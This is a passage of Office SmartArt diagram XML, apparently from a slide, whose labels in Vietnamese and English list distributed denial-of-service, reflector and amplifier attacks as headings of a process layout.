      <dgm:prSet presAssocID="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" presName="childNode" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="5">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{237E2EFB-A677-D844-819C-BBDED44A17C5}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="aSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="2" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="2" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1D30DF71-C875-B746-BD57-739E889A911A}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" type="pres">
      <dgm:prSet presAssocID="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" presName="childNode" presStyleLbl="node1" presStyleIdx="3" presStyleCnt="5">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6C9F7510-2C67-4149-B9CE-1EFEF7037AA3}" type="pres">
      <dgm:prSet presAssocID="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" presName="aSpace2" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8A36DE06-37D4-4D83-9873-7337CF5E1DCC}" type="pres">
      <dgm:prSet presAssocID="{6A904335-4CE7-4629-9C41-761C7F18C5CB}" presName="childNode" presStyleLbl="node1" presStyleIdx="4" presStyleCnt="5">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{E1736B09-914B-3149-8C3C-C974F30C88A6}" type="presOf" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{635717B1-99B8-854E-8F70-444337E2E550}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{9D567409-6782-4197-8A14-1E6DB223E281}" type="presOf" srcId="{6C2456D6-02A2-463B-84FB-58FA9BC9CCFC}" destId="{D4B43EB9-34A0-4A1E-B1D2-E5931E37D5D1}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{54900D11-8370-4BAA-83B1-119FD9DF4DD7}" type="presOf" srcId="{87CA5203-886D-476C-8773-A8952AD60B34}" destId="{A9014140-D8A6-4978-AA18-33E39D13DCC3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{0F31C51D-91C0-4E0B-9727-E860D9BD5093}" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{6A904335-4CE7-4629-9C41-761C7F18C5CB}" srcOrd="1" destOrd="0" parTransId="{3CEEE5CF-C7B9-4AEF-A7B5-DA4B8B9FAD6B}" sibTransId="{CEE72160-3C69-46DB-A6AD-0BFA85FF619A}"/>
    <dgm:cxn modelId="{C180D234-5927-BC40-BCEA-43D33D0E2CFA}" type="presOf" srcId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" destId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{D3860F36-28E4-1442-B86C-E63CCC3FE716}" type="presOf" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{329B575F-8B76-3B4B-9BD9-38FDE9A2A8A5}" type="presOf" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" srcOrd="0" destOrd="0" parTransId="{CC53E30A-CA09-8949-8B35-41834609C58A}" sibTransId="{2EFD9D0C-B667-974D-8EEE-876172C6068D}"/>
    <dgm:cxn modelId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{59372874-7672-E146-A97A-F29BFB4A2140}" srcOrd="0" destOrd="0" parTransId="{AFA358CC-DE03-B14E-9AD6-513B9ED3EF89}" sibTransId="{EF9C2E62-DCA0-D848-903A-2D9F9C026F51}"/>
    <dgm:cxn modelId="{B3D00490-7C13-454A-AF74-F2EC80517DBC}" type="presOf" srcId="{6A904335-4CE7-4629-9C41-761C7F18C5CB}" destId="{8A36DE06-37D4-4D83-9873-7337CF5E1DCC}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{98DE5C93-DBEB-254C-B03C-54648A10B03D}" type="presOf" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C36C829D-A004-4028-9721-68695252CABF}" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{6C2456D6-02A2-463B-84FB-58FA9BC9CCFC}" srcOrd="1" destOrd="0" parTransId="{91C50C1D-BD31-4068-8931-1663B5CE7505}" sibTransId="{F75DFBA4-DA8E-43C8-8428-53C14EC13100}"/>
    <dgm:cxn modelId="{4C7687B9-48C1-4798-BD8D-B09C9810512E}" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{87CA5203-886D-476C-8773-A8952AD60B34}" srcOrd="0" destOrd="0" parTransId="{7A55C87C-9179-41CE-AB58-0581F5C13054}" sibTransId="{4499DD0E-95A3-44B9-904B-72EF79CA9F34}"/>
    <dgm:cxn modelId="{752AFBC6-0A6F-E64D-8873-6214DED38720}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" srcOrd="2" destOrd="0" parTransId="{E5862108-903B-1C4B-9377-81DD29E52B29}" sibTransId="{B6EE5F2B-A910-414E-A3BF-34358F619072}"/>
    <dgm:cxn modelId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" srcOrd="0" destOrd="0" parTransId="{47925BA2-F0AA-1349-914E-93DB729B1439}" sibTransId="{DEA69FE8-A421-8F40-BC0D-0B81014C6103}"/>
    <dgm:cxn modelId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{92F30862-F847-FC4F-9375-31010EECD883}" srcOrd="1" destOrd="0" parTransId="{70431AB4-DF3F-4645-82B4-916A5B03ED2B}" sibTransId="{BC376F47-B3AB-B74F-80ED-DB7222180FD2}"/>
    <dgm:cxn modelId="{0DFD91DF-68AD-E649-B09C-E5EAFAEF15BB}" type="presOf" srcId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" destId="{331622DA-667B-3D42-86F2-0516235F2E15}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{CE6F23E2-A7A9-1447-B201-56CC65F45CC6}" type="presOf" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{200D4077-F322-A54F-A959-16520676AF19}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{9D4DE0EB-08A6-3544-A58B-08122AF0FDBE}" type="presOf" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{791A79EE-56E7-A044-A12E-44CBF852734D}" type="presOf" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{5AACC05E-5AB9-0E49-99B2-6E1BA6A41FDB}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{9FAD7FA9-8F47-104B-A9DC-EA081AA4F40E}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C8412F36-AC01-7A44-9697-143DB9CEC9BA}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{EA56AD11-7104-9640-9FC3-D2804E8F4001}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{46A30A50-3737-8B4D-B495-F1122505DBF8}" type="presParOf" srcId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" destId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{0F4D2BBE-62B8-453C-AD9E-9976670588FE}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{A9014140-D8A6-4978-AA18-33E39D13DCC3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{7DFB9ED6-D9AE-4B5B-B361-AC65A626A920}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{B09CC959-DFF6-4908-98C8-1AB0FE7625B3}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{D552C07A-0134-4D07-AC2E-C991B9C63E83}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{D4B43EB9-34A0-4A1E-B1D2-E5931E37D5D1}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{D328F87F-21F5-714F-9FB7-F211915773E5}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{12284197-3CBC-A34B-949D-A231607C1E8B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{BCE740ED-04BF-434E-8FEA-78F3668C6118}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{BBE8E148-330B-2A45-91F3-7D6EB629A869}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{200D4077-F322-A54F-A959-16520676AF19}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{CB56E221-F88E-FD47-9496-8D41D0D28A88}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{58069DFD-337B-484D-81D4-6343DAFF6EED}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{834C08AE-444E-F446-B0BF-3487CD228505}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{6B826E0E-A1E1-9D4F-9A76-1A15C480919D}" type="presParOf" srcId="{834C08AE-444E-F446-B0BF-3487CD228505}" destId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{14577FE3-E79A-1949-B26E-0D485D2BD999}" type="presParOf" srcId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" destId="{331622DA-667B-3D42-86F2-0516235F2E15}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C7F4E4E1-9BE9-DD45-B710-B33855AEC625}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{237E2EFB-A677-D844-819C-BBDED44A17C5}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{E68A7686-B35C-E54D-A2AA-94895E1983D7}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C4DC8DD8-8E37-A449-AF53-8C2D54A3BADC}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{4903066D-4C63-D442-B313-F0A620CD3979}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{A4CFDEB2-3173-414C-8A15-BB6822B38D19}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{1D30DF71-C875-B746-BD57-739E889A911A}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{F859185D-567E-B84D-A45C-B6DA4CE3C958}" type="presParOf" srcId="{1D30DF71-C875-B746-BD57-739E889A911A}" destId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{79536E11-1C43-1E46-BFA7-2611914FE8CB}" type="presParOf" srcId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" destId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{58446154-40ED-41F8-9BFB-B45A17D1C87F}" type="presParOf" srcId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" destId="{6C9F7510-2C67-4149-B9CE-1EFEF7037AA3}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{FE80E9E0-D380-482F-A5CD-29F962BEA835}" type="presParOf" srcId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" destId="{8A36DE06-37D4-4D83-9873-7337CF5E1DCC}" srcOrd="2"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CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2" loCatId="list" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple4" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/colorful3" csCatId="colorful" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{59372874-7672-E146-A97A-F29BFB4A2140}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
            </a:rPr>
            <a:t>Tấn công từ chối dịch vụ phân tán</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AFA358CC-DE03-B14E-9AD6-513B9ED3EF89}" type="parTrans" cxnId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EF9C2E62-DCA0-D848-903A-2D9F9C026F51}" type="sibTrans" cxnId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{92F30862-F847-FC4F-9375-31010EECD883}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
            </a:rPr>
            <a:t>Tấn công phản xạ</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{70431AB4-DF3F-4645-82B4-916A5B03ED2B}" type="parTrans" cxnId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BC376F47-B3AB-B74F-80ED-DB7222180FD2}" type="sibTrans" cxnId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>Reflector attack</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{47925BA2-F0AA-1349-914E-93DB729B1439}" type="parTrans" cxnId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DEA69FE8-A421-8F40-BC0D-0B81014C6103}" type="sibTrans" cxnId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" b="1"/>
            <a:t>Tấn công khuyêch đại</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E5862108-903B-1C4B-9377-81DD29E52B29}" type="parTrans" cxnId="{752AFBC6-0A6F-E64D-8873-6214DED38720}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B6EE5F2B-A910-414E-A3BF-34358F619072}" type="sibTrans" cxnId="{752AFBC6-0A6F-E64D-8873-6214DED38720}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>Amplifier attack</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CC53E30A-CA09-8949-8B35-41834609C58A}" type="parTrans" cxnId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2EFD9D0C-B667-974D-8EEE-876172C6068D}" type="sibTrans" cxnId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{87CA5203-886D-476C-8773-A8952AD60B34}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>Distributed Denial-of-Service</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7A55C87C-9179-41CE-AB58-0581F5C13054}" type="parTrans" cxnId="{4C7687B9-48C1-4798-BD8D-B09C9810512E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4499DD0E-95A3-44B9-904B-72EF79CA9F34}" type="sibTrans" cxnId="{4C7687B9-48C1-4798-BD8D-B09C9810512E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{635717B1-99B8-854E-8F70-444337E2E550}" type="pres">
      <dgm:prSet presAssocID="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" presName="theList" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A9014140-D8A6-4978-AA18-33E39D13DCC3}" type="pres">
      <dgm:prSet presAssocID="{87CA5203-886D-476C-8773-A8952AD60B34}" presName="childNode" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{12284197-3CBC-A34B-949D-A231607C1E8B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="aSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{200D4077-F322-A54F-A959-16520676AF19}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" type="pres">
